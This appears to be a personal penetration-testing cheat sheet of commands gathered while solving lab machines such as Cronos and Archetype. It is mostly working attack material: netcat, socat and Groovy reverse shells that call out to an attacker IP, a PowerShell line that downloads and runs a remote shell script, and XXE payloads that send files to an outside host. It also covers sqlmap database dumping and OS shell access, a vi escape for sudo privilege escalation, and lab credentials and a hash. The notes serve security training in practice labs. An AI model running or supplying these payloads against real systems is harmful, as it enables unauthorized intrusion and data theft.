<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Useful Shit<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

_________________________


<span class="date">Last Updated: 26/Aug/2021</span> 


<br/> 

### <span class="useful_shit subtitle">Most Reliable Reverse Shell Payload  
  ```console
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
  ```

 <br/><br/> 

### <span class="useful_shit subtitle">Python Script That Spawns a Shell When connecting to a Reverse Shell  
```console
python -c 'import pty;pty.spawn("/bin/bash");'
```
  <br/><br/> 

### <span class="useful_shit subtitle">SQLMAP  
* So I'm taking the machine "Cronos" as my example here because it's the first time I use `sqlmap` in.
* We can enumerate the databases names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data='username=&password=' --method POST --dbs --batch
  ```
* In addition to the databases' names the previous line also provided me with the version of the SQL on the server. 
* `--batch` answers the questions for me with the default. 
<br/>
* We can also get the tables' names by writing the following line:
  ```console
  sqlmap -u [LINK OF VICTIM] --data="username=&password=" --method POST -D [DATABASE NAME] --dump all --batch
  ```
* When using this command I also got the content of the admin table. 
* Sqlmap seems to use the SQLi vulneribility in the application to gain access to:
  * Determine the schema of the database (database, table and column names).
  * Dump data from tables.
  * Potentially upload or download files to the database server machine.
  * Perform out-of-band tests.
  * Dump usernames, password hashes, privileges and roles.
  * Pass hashes off to a password cracker for a dictionary attack.
  * Perform "blind" and "boolean-based" sql injection attacks (if the web application doesn't return any error messages then sqlmap is the most time-saving tool in this case).
  * Potentially even launch a remote shell on the database server.

 <br/><br/> 

### <span class="useful_shit subtitle">Robots.txt  

<blockquote>
The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.  
The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.
</blockquote>  

 <br/><br/> 


### <span class="useful_shit subtitle">DNS Zone Transfer  
* Definition?
  Is the process of copying the contents of the zone file on a primary DNS server to a secondary DNS server.  
  And this way fault tolerance is provided.

 <br/><br/> 



### <span class="useful_shit subtitle">PrivEsc 😈


* `cat /etc/shells`   
* Shows me what shells the machine uses  



<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.

<br/>

* `/usr/share/exploitdb/exploits`
* ExploitDB's exploits are saved in this path.  

<br/>

* Tools we can use to make life easier  
* <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux-Smart-Enumeration</a> and <a href="https://github.com/DominicBreuker/pspy">Pspy</a>.  

<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  





### <span class="useful_shit subtitle">Upgrading The Reverse Shell   

* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  




### <span class="useful_shit subtitle">Nmap  

* We can use the option `-oA [FILE NAME]` to save the nmap output in a file in the working directory.
  ```console
  nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
  ``` 

 <br/><br/> 

### <span class="useful_shit subtitle">Web Testing  

* We can use the command `whatweb [IP ADDRESS]` to see info about the web server.

 <br/><br/> 

### <span class="useful_shit subtitle">Changing Process Priority with *nice*   

  ```console
  nice -n [niceness value] [command]
  ```
  * -ve value is most likely to receive priority.
  * +ve value is the least likely to receive priority.

 <br/><br/> 

### <span class="useful_shit subtitle">Environment Variables  

  * To view the contents of an env variable
    ```console
    echo $[ENV VAR]
    ```

  * For the change in  the contents of a variable to be for all we have to export it  
    ```console
    export [ENVE VAR]
    ```  


 <br/><br/> 

### <span class="useful_shit subtitle">MySQL  

  * To access mysql database on localhost we can use  
    ```
    mysql -u [USERNAME] -p
    ```  

  * To access the database remotely  
    ```
    mysql -u [USERNAME] -p [IP ADDRESS]
    ```  

  * In the default configuration of mysql the root user's password is *empty*.

  * Mysql's command prompt. Some of its commands

    ```console
    mysql> show databases;
    mysql> select * from [TABLE NAME];
    mysql> use [DATABASE NAME];
    mysql> show tables;
    ```

  * Mysql is a service that can be run on a computer and I can run it as follows
    ```console
    kali> service mysql start
    ```


 <br/><br/> 

### <span class="useful_shit subtitle"> Proxy Servers  

* We can obscure our traffic by using proxies.
* Specifically, in Kali Linux there's a command for proxying called *proxychains*  
  ```console
  kali> proxychains [THE COMMAND YOU WANT TO PROXY] [ARGUMENTS]
  ``` 
* The configurations of `proxychains` are stored in a config file `/etc/proxychains.conf`. We can edit this file to set a proxy for the `proxychains` command to use.


 <br/><br/> 


* We can convert Hex to ASCII using the command `xxd`




## To Be re-written later  





gobuster dir -u 10.129.159.48 -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt

* If I need to exclude a status code because an error like this is encountered you can use the flag `-b` and then put the status codes you want to blacklist or `-s` and put the status codes you want to whitelist. Like this:  
```
gobuster dir -u http://10.129.159.48:8080/ -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt -b "403,404" 
```


* What does versions of software mean?   

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Semver.jpg/440px-Semver.jpg">  


* Groovy Script   
Groovy is a scripting language with Java-like syntax for the Java platform




* Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:

```groovy
String host="10.10.15.82";
int port=1234;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* What is SMB?  
<blockquote>
The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. It can also carry transaction protocols for interprocess communication. Over the years, SMB has been used primarily to connect Windows computers, although most other systems -- such as Linux and macOS -- also include client components for connecting to SMB resources.
</blockquote>

* How to use smbclient to view available shares:  
```
smbclient -L \\\\10.129.158.38 -U 'administrator'
```

* To access a share just remove the `-L` and specify the name of the share:  
```
smbclient \\\\10.129.158.38\\ADMIN$ -U 'administrator'
```

* The `$` means that this share is an administrative share.  

* We can use the command `get` inside the smb prompt to download files on our own box.

* `xp_cmdshell` allows me to spawn a Windows shell.

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc

M3g4c0rp123

-OutFile c:\\Users\Public\\winPEASany.exe

* grep substitute in Windows `C:\> netstat -na | findstr /c:"PORT"`

* To view hidden file in Windows `dir [DIR NAME] /a:h /b /s`

dir /a:h /b /s

IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.189 3001


* Oopsie  

* Why I got stuck? 
  * I didn't think of changing the id in the url I kept trying to guess the Access ID when in reality I could access it by decreasing the id in the url when I'm viewing the access ID of the guest user. 


rm /tmp/f;mkfifo /tmp/f;/bin/cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f


* `find directory-location -group {group-name} -name {file-name}` this syntax is used to find the files that belong to the group specified.

* SUID (Set owner User ID)

* Add new path to the $PATH variable 
 `export PATH=/some/new/path:$PATH`

export PATH=/tmp:$PATH

af13b0bee69f8a877c3faf667f7beacf
	
	
	

* Nmap results

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

* Banner Grab  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* So the problem was with the certificate. When I use `xfreerdp /v:[IP ADDRESS] /cert:ignore /u:Administrator`. 
* First off, we use Administrator instead of root in Windows machines.
* Second, I should've looked more into the flags or switches or whatever they call them. Anyway, it wouldn't have occured to me that I have to ignore the cert or that this was an option or that if I put it it will be functional.

```
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[03:25:50:883] [2009:2010] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion

```


PLEASE COMBINE THIS FILE WITH HELPFUL SHIT   

* we can copy the request into a file and then put the file in `sqlmap` as follows if we're suspecting an sql injection  

```console
sqlmap -r [FILE NAME]
```

* We can also use the switch/option/flag `--os-shell` to get a shell from the sql injection.



rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f

socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.10.15.189:4444

python3 -c 'import pty;pty.spawn("/bin/bash")'

P@s5w0rd!

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh
:shell

* To scan for UDP ports with nmap write the following `sudo nmap -Pn -sV -sU 10.129.126.250 `

* `.htpasswd` this file is used for basic HTTP authentication.
* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
mike:Sheffield19


tftp 10.129.132.172 -m binary -c put revShell.php revShell.php

* It seems like I will be making a container so that I can open it with root privilege.  

[[Linux]]
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/test2.php"> ]>
	
	<!DOCTYPE foo [  

<!ELEMENT foo (#ANY)>

<!ENTITY xxe SYSTEM "https://10.10.15.189/test.php">]><foo>&xxe;</foo>
	
	
	
	<!DOCTYPE root [<!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//10.10.15.189/WhatEver">]>
	
<root><name>test</name><tel>021212</tel><email>&steal;</email><password>pwd</password></root>‌
	
	
	* Try to use the repeater in Burp suite it save sooo much time
	* How to use rsa id to ssh  
	
	ssh -i id_rsa daniel@10.129.140.196